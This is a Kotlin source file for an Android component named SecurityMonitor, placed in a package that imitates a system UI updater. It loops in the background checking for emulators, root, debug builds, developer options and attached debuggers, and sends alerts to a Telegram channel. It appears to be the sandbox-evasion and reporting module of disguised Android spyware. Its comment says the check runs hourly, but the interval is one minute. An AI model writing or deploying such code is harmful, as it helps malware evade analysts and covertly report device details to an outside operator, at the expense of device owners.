package com.android.systemui.updater.security

import android.content.Context
import android.os.Build
import android.provider.Settings
import com.android.systemui.updater.TelegramClient
import com.android.systemui.updater.ErrorReporter
import java.io.File

object SecurityMonitor {
    private var monitoring = false
    private var monitorThread: Thread? = null

    fun start(context: Context, telegram: TelegramClient) {
        if (monitoring) return
        monitoring = true
        
        monitorThread = Thread {
            while (monitoring) {
                try {
                    val alerts = mutableListOf<String>()
                    
                    if (isEmulator()) alerts.add("⚠️ Emulator detected")
                    if (isRooted()) alerts.add("⚠️ Root detected")
                    if (isDebuggable(context)) alerts.add("⚠️ Debuggable build")
                    if (areDeveloperOptionsEnabled(context)) alerts.add("⚠️ Developer options enabled")
                    if (isDebuggerAttached()) alerts.add("⚠️ Debugger attached")
                    
                    if (alerts.isNotEmpty()) {
                        telegram.sendText("🔒 Security Alert:\n${alerts.joinToString("\n")}")
                    }
                } catch (e: Exception) {
                    ErrorReporter.report(e, "SecurityMonitor")
                }
                
                try {
                    Thread.sleep(60_000) // Check every hour (in production, make it longer)
                } catch (_: InterruptedException) {
                    break
                }
            }
        }.apply { start() }
    }

    fun stop() {
        monitoring = false
        monitorThread?.interrupt()
    }

    private fun isEmulator(): Boolean {
        return Build.FINGERPRINT.contains("generic") ||
               Build.FINGERPRINT.contains("unknown") ||
               Build.MODEL.contains("Emulator") ||
               Build.MODEL.contains("Android SDK built for x86") ||
               Build.MANUFACTURER.contains("Genymotion") ||
               Build.BRAND.startsWith("generic") ||
               Build.DEVICE.startsWith("generic") ||
               Build.PRODUCT.contains("sdk") ||
               Build.PRODUCT.contains("google_sdk") ||
               Build.PRODUCT.contains("vbox86") ||
               File("/dev/qemu_pipe").exists() ||
               try { 
                   Class.forName("android.os.SystemProperties").getMethod("get", String::class.java)
                       .invoke(null, "ro.kernel.qemu").toString() == "1"
               } catch (_: Exception) { false }
    }

    private fun isRooted(): Boolean {
        val suPaths = arrayOf(
            "/system/bin/su", "/system/xbin/su", "/system/su",
            "/su/bin/su", "/system/sudo", "/system/bin/failsafe/su",
            "/data/local/xbin/su", "/data/local/bin/su", "/data/local/su"
        )
        if (suPaths.any { File(it).exists() }) return true
        
        // Try executing su
        return try {
            Runtime.getRuntime().exec(arrayOf("which", "su")).waitFor() == 0
        } catch (e: Exception) {
            false
        }
    }

    private fun isDebuggable(context: Context): Boolean {
        return (context.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0
    }

    private fun areDeveloperOptionsEnabled(context: Context): Boolean {
        return Settings.Secure.getInt(
            context.contentResolver,
            Settings.Secure.DEVELOPMENT_SETTINGS_ENABLED, 0
        ) == 1
    }

    private fun isDebuggerAttached(): Boolean {
        return android.os.Debug.isDebuggerConnected()
    }
}
